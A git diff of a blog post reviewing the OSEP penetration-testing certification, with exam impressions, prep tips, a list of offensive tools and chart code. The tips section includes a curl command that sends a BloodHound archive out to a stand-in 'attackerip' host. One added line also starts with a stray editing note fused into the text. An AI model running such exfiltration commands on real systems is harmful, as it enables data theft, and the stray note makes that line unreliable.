@@ -7,7 +7,7 @@ tags: [certs, osep, pentesting]
 
 I recently passed the OSEP exam on the first attempt, achieving both independent requirements to pass: 100+ points and the slippery `secret.txt` flag. 💅
 
-I wanted to solidify my internal pentesting skillz, since I'm generally more comfortable with web hacking (check my [OSWE cert review](./2026-05-03-passing-osep.md)). So it was a great opportunity to learn and test myself in a challenging environment.
+Refined clarity while preserving casual voice and toneI wanted to solidify my internal pentesting skillz, since web hacking is more my comfort zone (check my [OSWE cert review](./2026-05-03-passing-osep.md)). So this was a great opportunity to push myself and learn in a challenging environment.
 
 Here I'll share my personal experience preparing for this exam.
 
@@ -35,16 +35,16 @@ Fun fact: I managed to [escalate a sqli to an rce](/escalating-preauth-sqli-to-r
 #### stuff I liked
 - the network section was accurate and aligned with what I've seen in real enterprise setups.
 - the demo of _why_ and _how_ the default meterpreter obfuscation gets flagged is 🔥.
-- the challenges' attack paths cover the course material organically.
+- the challenges' attack paths cover the course material quite organically.
 - the adcs section has now been included!
-- phishing via ics calendar invites was pretty interesting and up to date.
+- phishing via ics calendar invites was very interesting and up to date.
 - pwning ci/cd pipelines open a ton of possibilities for latmov. Learned a lot here!
 
 #### stuff I didn't \*love\*
-- **sometimes post-exploitation is too crazy**: once you're local admin you have too much freedom. e.g. disabling defender and/or firewall rules.
+- **post-exploitation is sometimes too permissive**: once you're local admin, you can do basically anything, like disabling defender and/or firewall rules.
 - **few OPSEC refs/considerations**, e.g. psexec usage, `net user`, etc.
-- **some av bypasses are too naïve**, e.g. process hollowing by itself would be blocked by Crowdstrike or any other competent EDR. That said, EDR evasion is a demanding field that requires constant updates. This course provides a solid baseline.
-- **phishing is mostly vba macros and hta**. Both techniques are a bit outdated (e.g. macros disabled by default) and easy for any competent SOC to detect.
+- **some AV bypasses are too naïve**, e.g. vanilla process hollowing would get caught by Crowdstrike or any other competent EDR. That said, EDR evasion is a demanding field that requires constant updates, and this course does provide a solid baseline.
+- **phishing is mostly vba macros and hta**. both are a bit outdated (macros are disabled by default now) and easy to detect.
 
 ### reqs
 IMHO, the following skills matter:
@@ -64,7 +64,7 @@ I prepped for 1.5 months, and this was my strategy:
 ### r4nd0m tips
 - you can compile with [mono](https://www.mono-project.com/) to avoid visual studio. I basically managed to compile everything in kali and didn't touch the windows lab machine[^3]!
 - change the name of the artifacts because they don't necessarily overwrite![^2]
-- updog is god. you can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
+- [updog](https://github.com/sc0tfree/updog) is god. You can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
 - migrate your revshell processes for stability.
 - get comfortable with network pivoting.
 - become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide.
@@ -97,14 +97,14 @@ Not strictly required, but the book _"Evading EDR"_ from No Starch Press is 🔥
 ### my gig
 Here was my arsenal of tools[^5]:
 - external recon: [autorecon](https://github.com/AutoRecon/AutoRecon)
-- c2: keep calm and use meterpreter (with custom C# loaders aligned with the book's content)
+- c2: keep calm and use [meterpreter](https://www.offsec.com/metasploit-unleashed/) (with custom c# loaders aligned with the book's content)
 - clm: [bypass-clm](https://github.com/calebstewart/bypass-clm)
 - obfuscation: [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) and [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-obfuscation)
 - vba macros: [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
 - file sharing: [updog](https://github.com/sc0tfree/updog). It has file upload functionality too!
 - ad enum: [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and [adpeas](https://github.com/61106960/adPEAS)
 - hta: [Dotnet2JScript](https://github.com/tyranid/dotnettojscript) loading the js as an external file
-- privesc: [peas-ng suite](https://github.com/peass-ng/PEASS-ng/tree/master) and [powerup](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). But honestly, I ended up doing everything manually.
+- privesc enum: [peas-ng suite](https://github.com/peass-ng/PEASS-ng/tree/master) and [powerup](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). But honestly, I ended up doing everything manually.
 - revshell: [penelope](https://github.com/brightio/penelope)
 - compiler: [mono](https://www.mono-project.com/), downloading missing dll dependencies from [nuget.org](https://nuget.org)
 
@@ -134,11 +134,16 @@ Finally, I crafted the report with sysreptor and sent it for review that same ev
 
 #### timeline
 
-~~I~~ Claude created this fun timeline of my exam progress:
+I asked Claude to create this fun timeline of my exam progress:
 
 <style>
   .wrap { max-width: 1400px; margin: 0 auto; }
   .chart-box { position: relative; height: 640px; }
+  .timeline-fallback { display: none; }
+  @media (max-width: 768px) {
+    .wrap { display: none; }
+    .timeline-fallback { display: block; }
+  }
 </style>
 
 <div class="wrap">
@@ -146,6 +151,8 @@ Finally, I crafted the report with sysreptor and sent it for review that same ev
     <canvas id="osepChart"></canvas>
   </div>
 </div>
+
+<img class="timeline-fallback" src="/assets/img/osep-timeline.png" alt="OSEP exam timeline" />
 
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-annotation@3.0.1/dist/chartjs-plugin-annotation.min.js"></script>
@@ -330,7 +337,6 @@ Finally, I crafted the report with sysreptor and sent it for review that same ev
               xAdjust: 0,
               yAdjust: -22,
               padding: 4,
-              backgroundColor: 'rgba(255, 255, 255, 0.9)'
             }
           }
         }
